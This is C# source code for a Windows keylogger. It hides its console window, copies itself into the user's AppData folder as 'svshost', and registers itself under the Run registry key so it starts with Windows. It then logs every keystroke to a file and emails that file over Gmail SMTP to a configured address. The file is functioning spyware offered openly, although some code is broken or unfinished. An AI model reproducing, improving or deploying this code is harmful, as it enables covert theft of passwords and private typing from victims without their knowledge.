using System;
using System.Net.Mail; // include reference
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;
using System.IO;
using System.IO.Compression;
using System.Collections.Generic;

namespace KeyLogger
{
    class KeyLoggerClass
    {
        #region Constants
        public const int HOMEKEY = 36;
        public const int ENDKEY = 35;
        public const int ENTERKEY = 13;
        public const int SPACEKEY = 32;
        public const int SW_HIDE = 0;
        public const int COUNTKEYS = 255;
        public const string AppName = "svshost";
        //public const string GuidFirst = "8c4d2677-1f83-45f7-90b3-8723f400d800";
        public static int idx = 0; // to do
        public const List<String> Guids = new List<String>() { "8c4d2677-1f83-45f7-90b3-8723f400d800", "91456c6f-a9e7-4e81-a157-138bfe6ad66a" };
        #endregion

        #region WinAPI
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool SetConsoleCtrlHandler(ConsoleEventDelegate callback, bool add);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetConsoleWindow();

        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        #endregion

        #region FileWriting
        public static string filename = "3a277973-20e1-4549-9c9e-3f5ffa32c43c.txt"; // generated guid.newGuid()
        public static System.IO.StreamWriter myFile = null;
        #endregion

        #region ConsoleOnClose

        public delegate bool ConsoleEventDelegate(int eventType);

        public static bool ConsoleEventCallback(int eventType)
        {
            if (eventType == 2)
            {
                myFile.Close();
                KeyLoggerClass.Email_Send();
                return true;
            }
            return false;
        } // when console closes

        public static ConsoleEventDelegate handler;   // Keeps it from getting garbage collected

        #endregion

        public static void Email_Send() 
        {
            MailMessage mail = new MailMessage();
            SmtpClient SmtpServer = new SmtpClient("smtp.gmail.com");
            mail.From = new MailAddress(System.Configuration.ConfigurationSettings.AppSettings["MailFrom"]);
            mail.To.Add(System.Configuration.ConfigurationSettings.AppSettings["MailTo"]);
            mail.Subject = "spy is real";
            mail.Body = "keylogger via c sharp";

            System.Net.Mail.Attachment attachment;
            attachment = new System.Net.Mail.Attachment(filename);
            mail.Attachments.Add(attachment);

            SmtpServer.Port = Convert.ToInt16(System.Configuration.ConfigurationSettings.AppSettings["Port"]);
            SmtpServer.Credentials = new System.Net.NetworkCredential(System.Configuration.ConfigurationSettings.AppSettings["MailFrom"], System.Configuration.ConfigurationSettings.AppSettings["PasswordFrom"]);
            SmtpServer.EnableSsl = true;
            SmtpServer.Send(mail);
        }
        public static void MoveToWindowsFolder()
        {
            String CopiedProgrammPath = "c:\\users\\" + Environment.UserName + "\\Appdata\\Local";

            //ZipFile zip = new ZipFile();
            String file = Application.ExecutablePath;
            String to = "d:\\tmp.zip";
            //string startPath = @"c:\example\start";
            
            String extractPath = CopiedProgrammPath;
            try
            {
                ZipFile.CreateFromDirectory(file, to);
            }
            catch (IOException)
            {
                // continue if file is already defined
            }
            using (ZipArchive zip = ZipFile.Open(to, ZipArchiveMode.Update))
            {
                zip.CreateEntryFromFile(file, AppName + ".exe");
            }
            try
            {
                ZipFile.ExtractToDirectory(to, extractPath);
            }
            catch 
            {
                // already exists
            }
            File.Delete(to);
        }
            //File.Copy(from, to);


            //string src = System.Diagnostics.Process.GetCurrentProcess().MainModule.FileName;
           // string dest = "C:\\" + System.Diagnostics.Process.GetCurrentProcess().MainModule.ModuleName;
            //System.IO.File.Copy(src, dest);


        
     // decrypt and ecrypt itself 
        // then compile decrypted file and copy it somewhere
        // csc
        public static bool SetAutorunValue(bool autorun, String path)
        {
            
            RegistryKey reg;
            reg = Registry.CurrentUser.CreateSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run");
              //Microsoft.Win32.RegistryKey myKey =Microsoft.Win32.Registry.LocalMachine.OpenSubKey(@"\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\", true);
              //myKey.SetValue(AppName, Application.ExecutablePath);
            try
            {
                if (autorun)
                    reg.SetValue(Guids[idx], path); // to do 
                else
                    reg.DeleteValue(AppName);
                reg.Close();
            }
            catch
            {
                return false;
            }
            return true;
            idx++;
        }
        public static void HideWindow()
        {
            var handle = GetConsoleWindow();
            // Hide
            ShowWindow(handle, SW_HIDE); 

        }

        public static void Main(string[] args)
        {
            HideWindow();
            SetAutorunValue(true, Application.ExecutablePath);
            MoveToWindowsFolder();
            SetAutorunValue(true, "c:\\users\\" + Environment.UserName + "\\Appdata\\Local\\" + AppName + ".exe");
            handler = new ConsoleEventDelegate(ConsoleEventCallback); // subscribe onclose event to ConsoleEventCallback
            SetConsoleCtrlHandler(handler, true);                     // subscribe onclose event to ConsoleEventCallback
            if (System.IO.File.Exists(filename)) // if file exists then delete it and create again
            {
                System.IO.File.Delete(filename);
            }
            myFile  = new System.IO.StreamWriter(filename); 
            myFile.WriteLineAsync(DateTime.Now.ToString()); // write date to top of file
            StartLogging();
        }
    
        public static void StartLogging()
        {
            int lastKey = 0;
            while (true)
            {
                //sleeping for while, this will reduce load on cpu
                Thread.Sleep(10);
                for (Int32 i = 0; i < COUNTKEYS; i++) 
                {
                    int keyState = GetAsyncKeyState(i);
                    if (keyState == 1 || keyState == -32767) // if key is about keyboard or mouse
                    {
                        switch (i)
                        {
                            case SPACEKEY:
                                myFile.WriteAsync(" ");
                                break;
                            case ENTERKEY:
                                myFile.WriteLineAsync(myFile.NewLine);
                                break;
                            case ENDKEY:
                                if (lastKey == HOMEKEY)
                                {
                                    myFile.WriteLineAsync("Home+End pressed!!!");
                                    ConsoleEventCallback(2); // exit event code 
                                    Environment.Exit(0);
                                }
                                else
                                {
                                    myFile.WriteAsync(((Keys)i).ToString());
                                }
                                break;
                            default:
                                myFile.WriteAsync(((Keys)i).ToString()); // write key to file
                               // Console.WriteLine(i);
                                break;
                        }
                        lastKey = i;
                    }
                }
            }
            
        }
    }
}